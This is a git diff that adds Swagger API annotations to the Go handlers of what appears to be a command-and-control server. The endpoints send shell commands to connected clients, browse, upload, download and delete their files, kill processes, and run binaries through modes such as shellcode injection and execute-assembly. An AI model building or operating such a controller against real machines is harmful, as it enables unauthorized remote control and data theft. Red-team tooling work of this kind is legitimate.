@@ -21,6 +21,16 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
+// @Summary Get all connected clients
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param page query int false "Page number"
+// @Param page_size query int false "Page size"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients [get]
+// @Security BearerAuth
 func GetClients(c *gin.Context) {
 	var clientGet struct {
 		Page     int `form:"page"`
@@ -38,6 +48,16 @@ func GetClients(c *gin.Context) {
 		"total": len(clientData),
 	})
 }
+// @Summary Send a shell command to a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param command body object true "Command to execute"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/shell/commands [post]
+// @Security BearerAuth
 func SendCommands(c *gin.Context) {
 	uid := c.Param("uid")
 	var commands struct {
@@ -58,12 +78,31 @@ func SendCommands(c *gin.Context) {
 	response.OK(c, shellHistory.ShellContent)
 }
 
+// @Summary Get shell output from a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/shell/output [get]
+// @Security BearerAuth
 func GetShellContent(c *gin.Context) {
 	uid := c.Param("uid")
 	var shell database.Shell
 	database.Engine.Where("uid = ?", uid).Get(&shell)
 	response.OK(c, shell.ShellContent)
 }
+// @Summary Get process list from a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/processes [get]
+// @Security BearerAuth
 func GetPidList(c *gin.Context) {
 	uid := c.Param("uid")
 	// 创建 UID 对应的通道队列
@@ -84,12 +123,33 @@ func GetPidList(c *gin.Context) {
 		response.Timeout(c)
 	}
 }
+// @Summary Kill a process on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param pid path string true "Process ID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/processes/{pid} [delete]
+// @Security BearerAuth
 func KillPid(c *gin.Context) {
 	uid := c.Param("uid")
 	pid := c.Param("pid")
 	sendcommand.SendCommand(uid, "kill "+pid)
 	response.OK(c, "killed")
 }
+// @Summary Browse files on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param dirPath query string true "Directory path to browse"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/files [get]
+// @Security BearerAuth
 func FileBrowse(c *gin.Context) {
 	uid := c.Param("uid")
 	var fileBody struct {
@@ -125,6 +185,17 @@ func FileBrowse(c *gin.Context) {
 	}
 
 }
+// @Summary Delete a file on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param filePath query string true "File path to delete"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/files [delete]
+// @Security BearerAuth
 func FileDelete(c *gin.Context) {
 	uid := c.Param("uid")
 	var fileBody struct {
@@ -157,6 +228,17 @@ func FileDelete(c *gin.Context) {
 		response.Timeout(c)
 	}
 }
+// @Summary Create a directory on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param dirPath body object true "Directory path to create"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/files/directories [post]
+// @Security BearerAuth
 func MakeDir(c *gin.Context) {
 	uid := c.Param("uid")
 	var dirBody struct {
@@ -189,6 +271,17 @@ func MakeDir(c *gin.Context) {
 		response.Timeout(c)
 	}
 }
+// @Summary Upload a file to a client
+// @Tags Clients
+// @Accept multipart/form-data
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param file formData file true "File to upload"
+// @Param uploadPath formData string true "Upload destination path"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/files/upload [post]
+// @Security BearerAuth
 func FileUpload(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
@@ -239,12 +332,31 @@ func FileUpload(c *gin.Context) {
 	}()
 	response.OK(c, nil)
 }
+// @Summary Get note for a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/note [get]
+// @Security BearerAuth
 func GetNote(c *gin.Context) {
 	uid := c.Param("uid")
 	var Note database.Notes
 	database.Engine.Where("uid = ?", uid).Get(&Note)
 	response.OK(c, Note.Note)
 }
+// @Summary Save note for a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param noteContent body object true "Note content to save"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/note [put]
+// @Security BearerAuth
 func SaveNote(c *gin.Context) {
 	uid := c.Param("uid")
 	var noteBody struct {
@@ -260,6 +372,16 @@ func SaveNote(c *gin.Context) {
 	database.Engine.Where("uid = ?", uid).Update(&Note)
 	response.OK(c, nil)
 }
+// @Summary Request a file download from a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param filePath body object true "File path to download"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/files/download [post]
+// @Security BearerAuth
 func DownloadFile(c *gin.Context) {
 	uid := c.Param("uid")
 	var fileBody struct {
@@ -359,6 +481,15 @@ type DownloadsInfo struct {
 	DownloadedPart string `json:"downloadPart"`
 }
 
+// @Summary Get download status for a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/downloads [get]
+// @Security BearerAuth
 func GetDownloadsInfo(c *gin.Context) {
 	uid := c.Param("uid")
 	var downloads []database.Downloads
@@ -379,6 +510,17 @@ func GetDownloadsInfo(c *gin.Context) {
 	}
 	response.OK(c, result)
 }
+// @Summary Fetch a downloaded file from the server
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param filePath body object true "File path to fetch"
+// @Success 200 {file} binary "File content"
+// @Failure 400 {object} object "bad request"
+// @Failure 404 {object} object "file not found"
+// @Router /api/v1/clients/{uid}/downloads/fetch [post]
+// @Security BearerAuth
 func DownloadDownloadedFile(c *gin.Context) {
 	uid := c.Param("uid")
 	var downloadBody struct {
@@ -417,6 +559,16 @@ func DownloadDownloadedFile(c *gin.Context) {
 	// 发送文件
 	c.File(fullPath)
 }
+// @Summary List drives on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/drives [get]
+// @Security BearerAuth
 func ListDrives(c *gin.Context) {
 	uid := c.Param("uid")
 
@@ -438,6 +590,17 @@ func ListDrives(c *gin.Context) {
 		response.Timeout(c)
 	}
 }
+// @Summary Fetch content of a file on a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param path query string true "File path to read"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Failure 408 {object} object "timeout"
+// @Router /api/v1/clients/{uid}/files/content [get]
+// @Security BearerAuth
 func FetchFileContent(c *gin.Context) {
 	uid := c.Param("uid")
 	var contentBody struct {
@@ -465,6 +628,15 @@ func FetchFileContent(c *gin.Context) {
 	}
 
 }
+// @Summary Disconnect and remove a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid} [delete]
+// @Security BearerAuth
 func ExitClient(c *gin.Context) {
 	uid := c.Param("uid")
 	sendcommand.SendCommand(uid, "exit")
@@ -498,6 +670,16 @@ func ExitClient(c *gin.Context) {
 
 	response.OK(c, nil)
 }
+// @Summary Add a note to a client
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param note body object true "Note text"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/note [post]
+// @Security BearerAuth
 func AddUidNote(c *gin.Context) {
 	uid := c.Param("uid")
 	var noteBody struct {
@@ -511,6 +693,16 @@ func AddUidNote(c *gin.Context) {
 	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Note: noteBody.Note})
 	response.OK(c, nil)
 }
+// @Summary Edit client sleep interval
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param sleep body object true "Sleep interval in seconds"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/sleep [put]
+// @Security BearerAuth
 func EditSleep(c *gin.Context) {
 	uid := c.Param("uid")
 	var sleepBody struct {
@@ -524,6 +716,16 @@ func EditSleep(c *gin.Context) {
 	sendcommand.SendCommand(uid, "sleep "+sleepBody.Sleep)
 	response.OK(c, nil)
 }
+// @Summary Edit client display color
+// @Tags Clients
+// @Accept json
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param color body object true "Color value"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/color [put]
+// @Security BearerAuth
 func EditColor(c *gin.Context) {
 	uid := c.Param("uid")
 	var colorBody struct {
@@ -536,6 +738,18 @@ func EditColor(c *gin.Context) {
 	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Color: colorBody.Color})
 	response.OK(c, nil)
 }
+// @Summary Execute binary on a client
+// @Tags Clients
+// @Accept multipart/form-data
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param file formData file true "Binary file to execute"
+// @Param args formData string false "Arguments"
+// @Param mode formData string true "Execution mode (execute-assembly|inline-bin|shellcode-inject|inline-execute)"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/execute [post]
+// @Security BearerAuth
 func ExecuteBin(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
@@ -608,6 +822,17 @@ func ExecuteBin(c *gin.Context) {
 	response.OK(c, nil)
 }
 
+// @Summary Execute Linux script on a client
+// @Tags Clients
+// @Accept multipart/form-data
+// @Produce json
+// @Param uid path string true "Client UID"
+// @Param file formData file true "Script file to execute"
+// @Param args formData string false "Arguments"
+// @Success 200 {object} object "success"
+// @Failure 400 {object} object "bad request"
+// @Router /api/v1/clients/{uid}/execute-linux-script [post]
+// @Security BearerAuth
 func ExecuteLinuxScript(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
